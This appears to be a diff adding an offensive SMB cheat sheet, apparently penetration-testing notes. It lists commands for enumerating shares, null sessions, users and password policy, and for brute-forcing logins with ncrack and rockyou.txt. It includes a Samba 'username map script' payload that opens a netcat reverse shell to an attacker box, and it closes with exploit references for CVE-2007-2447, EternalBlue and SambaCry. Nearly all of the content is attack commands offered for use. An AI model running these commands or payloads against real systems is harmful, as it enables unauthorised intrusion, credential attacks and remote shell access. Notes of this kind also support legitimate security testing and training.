@@ -1,1 +1,40 @@
+SMB (139 & 445)
+nmap --script smb-protocols 10.10.10.10
+smbclient -L //10.10.10.10
+smbclient -L //10.10.10.10 -N         // No password (SMB Null session)
+smbclient --no-pass -L 10.10.10.10
+smbclient //10.10.10.10/share_name
+smbmap -H 10.10.10.10
+smbmap -H 10.10.10.10 -u '' -p ''
+smbmap -H 10.10.10.10 -s share_name 
+crackmapexec smb 10.10.10.10 -u '' -p '' --shares
+crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares
+crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares
+crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name
+crackmapexec smb 192.168.0.115 -u '' -p '' --shares --pass-pol
+enum4linux -a 10.10.10.10
+rpcclient -U "" 10.10.10.10
+    * enumdomusers 
+    * enumdomgroups
+    * queryuser [rid]
+    * getdompwinfo
+    * getusrdompwinfo [rid]
+ncrack -u username -P rockyou.txt -T 5 10.10.10.10 -p smb -v
+mount -t cifs "//10.1.1.1/share/" /mnt/wins
+mount -t cifs "//10.1.1.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0,gid=0
 
+SMB Shell to Reverse Shell : 
+    smbclient -U "username%password" //192.168.0.116/sharename
+    smb> logon “/=nc ‘attack box ip’ 4444 -e /bin/bash" 
+    
+SMB Exploits:
+Samba “username map script” Command Execution - CVE-2007-2447
+	- Version 3.0.20 → 3.0.25rc3
+	- Samba-usermap-exploit.py 
+	
+Eternal Blue - CVE-2017-0144
+	- SMB v1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016
+	
+SambaCry - CVE-2017-7494
+	- 4.5.9 version and before. 
+	- https://github.com/opsxcq/exploit-CVE-2017-7494 
